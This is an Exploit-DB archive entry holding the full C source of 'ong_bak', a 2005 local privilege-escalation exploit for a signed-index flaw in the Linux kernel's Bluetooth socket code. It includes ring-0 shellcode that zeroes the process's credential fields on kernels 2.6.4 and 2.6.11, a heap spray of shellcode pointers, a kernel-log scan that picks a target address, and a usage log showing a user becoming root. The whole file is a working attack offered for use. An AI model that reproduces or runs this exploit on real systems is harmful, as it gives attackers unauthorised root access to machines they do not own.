/*
EDB Note: Update can be found here ~ https://www.exploit-db.com/exploits/926/

source: https://www.securityfocus.com/bid/12911/info

A local signed-buffer-index vulnerability affects the Linux kernel because it fails to securely handle signed values when validating memory indexes.

A local attacker may leverage this issue to gain escalated privileges on an affected computer.
*/

/*
  ONG_BAK v0.3   [april 8th 05]
"""""""""""""""""""""""""""""""""
ong_bak now checks the value of ecx and launches
the exploit in case a suitable value has been found!



  ONG_BAK v0.1   [april 4th 05]
"""""""""""""""""""""""""""""""""

local root exploit for the bluetooth bug

usage:

the bug is quite stable so you can't realy fuck things up
if you stick to the following:

play around with the negative argument until ecx points to
our data segment:

qobaiashi@voyager:~> id
uid=1000(qobaiashi) gid=100(users)
Gruppen=14(uucp),16(dialout),17(audio),33(video),100(users)
qobaiashi@voyager:~> ./ong_bak -1002341
-|-local bluez exploit v.0.3  -by qobaiashi-
 |
 |- i've found kernel 2.6.4-52-default
 |- trying...
 |- [ecx: 0b8f0f0f ]
qobaiashi@voyager:~> ./ong_bak -10023411
-|-local bluez exploit v.0.3  -by qobaiashi-
 |
 |- i've found kernel 2.6.4-52-default
 |- trying...
 |- [ecx: 0809da40 ]
 |- suitable value found!using 0x0809da40
 |- the time has come to push the button..
qobaiashi@voyager:~> id
uid=0(root) gid=0(root) Gruppen=14(uucp),16(dialout),17(audio),33(video),100(users)
qobaiashi@voyager:~>

the parent process becomes root.

that's it.
unfortunately it's not yet very practicable..

qobaiashi@u-n-f.com

*/

#include <sys/klog.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <sys/utsname.h>


#define BRKVAL 0x0cec9000 //should be enough but fix it if you get an error


void usage(char *path);

//due to changing task_structs we need different offsets
char k_give_root[] =  //----[ give root in ring0/tested on linux2.6.5/x86/ by -q ]-----\\
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x31\xc0"                        // xor    %eax,%eax
"\xb8\x00\xe0\xff\xff"            // mov    $0xffffe000,%eax
"\x21\xe0"                        // and    %esp,%eax
"\x8b\x00"                        // mov    (%eax),%eax
"\x8b\x80\xa4\x00\x00\x00"        // mov    0xa4(%eax),%eax
"\xc7\x80\xf0\x01\x00\x00\x00"    // movl   $0x0,0x1f0(%eax)
"\x00\x00\x00"
"\xc7\x80\xf4\x01\x00\x00\x00"    // movl   $0x0,0x1f4(%eax)
"\x00\x00\x00"
"\xc7\x80\x00\x02\x00\x00\x00"    // movl   $0x0,0x200(%eax)
"\x00\x00\x00"
"\xc7\x80\x04\x02\x00\x00\x00"    // movl   $0x0,0x204(%eax)
"\x00\x00\x00"
"\x31\xc0"                        // xor    %eax,%eax
"\x40"                            // inc    %eax
"\xcd\x80"                        // int    $0x80
;



char k_give_root2[] =  //----[ give root in ring0/tested linux2.6.11/x86/ by -q ]-----\\
"\x90\x90\x90\x90"
"\x90\x90\x90\x90"
"\x31\xc0"                        // xor    %eax,%eax
"\xb8\x00\xe0\xff\xff"            // mov    $0xffffe000,%eax
"\x21\xe0"                        // and    %esp,%eax
"\x8b\x00"                        // mov    (%eax),%eax
"\x8b\x80\x9c\x00\x00\x00"        // mov    0x9c(%eax),%eax
"\xc7\x80\x68\x01\x00\x00\x00"    // movl   $0x0,0x168(%eax)
"\x00\x00\x00"
"\xc7\x80\x78\x01\x00\x00\x00"    // movl   $0x0,0x178(%eax)
"\x00\x00\x00"
"\xc7\x80\x6c\x01\x00\x00\x00"    // movl   $0x0,0x16c(%eax)
"\x00\x00\x00"
"\xc7\x80\x7c\x01\x00\x00\x00"    // movl   $0x0,0x17c(%eax)
"\x00\x00\x00"
"\x31\xc0"                        // xor    %eax,%eax
"\x40"                            // inc    %eax
"\xcd\x80"                        // int    $0x80
;



main(int argc, char *argv[])
{
char buf[2048];
int sock, *mod = (int*)buf;
unsigned int arg;
int tmp;
char *check, *ong_code = 0;
struct utsname vers;

printf("-|-local bluez exploit v.0.3  -by qobaiashi-\n |\n");
if (uname(&vers) < 0)
   printf(" |- couldn't determine kernel version\n");

else
   {
    printf(" |- i've found kernel %s\n", vers.release);
    if(strstr(vers.release, "2.6.11") > 0) ong_code = k_give_root2;
    if(strstr(vers.release, "2.6.4")  > 0) ong_code = k_give_root;
   }

if (ong_code == 0)
   {
    printf(" |- no supported version found..trying 2.6.4 code\n");
    ong_code = k_give_root;
    }


if( brk((void*)BRKVAL) == -1 )
  {
    printf(" |- brk failed..exiting\n");
    exit(1);
   }


if (argc < 2)
   {
    usage(argv[0]);
    exit(1);
    }

if (argc == 2)
    arg = strtoul(argv[1], 0, 0);

if (argc == 3)
   {
    arg = strtoul(argv[1], 0, 0);
    mod = (unsigned int*)strtoul(argv[2], 0, 0);
   }

if (fork() != 0)//parent watch the Oops
   {
    //previous Oops printing
   usleep(100);
   if ((tmp = klogctl(0x3, buf, 1700)) > -1)
       {
        check = strstr(buf, "ecx: ");
        printf(" |- [%0.14s]\n", check);
        if (*(check+5) == 0x30 && *(check+6) == 0x38)
           {
           check+=5;
           printf(" |- suitable value found!using 0x%0.9s\n", check);
           printf(" |- the time has come to push the button... check your id!\n");
           *(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';
           mod = (unsigned int*)strtoul(check, 0, 0);
           for (sock = 0;sock <= 200;sock++)
                *(mod++) = (int)ong_code;//link to shellcode

            if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
               {
                printf(" |- something went w0rng (invalid value)\n");
                exit(1);
               }

           }
        }
   return 0;
   }

if (fork() == 0)//child does the exploit
{
  for (sock = 0;sock <= 200;sock++)
     *(mod++) = (int)ong_code;//link to shellcode

  printf(" |- trying...\n");
  if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) < 0)
      {
      printf(" |- something went w0rng (invalid value)\n");
      exit(1);
     }
}

exit(0);
}



/*****************\
|**    usage    **|
\*****************/
void usage(char *path)
{
printf(" |----------------------------\n");
printf(" | usage: %s <negative value> \n", path);
printf(" | tested:\n");
printf(" | SuSE 9.1:      -10023411  \n");
printf(" |                -10029 \n");
printf(" | Kernel 2.6.11: -10023 \n");
exit(0);
}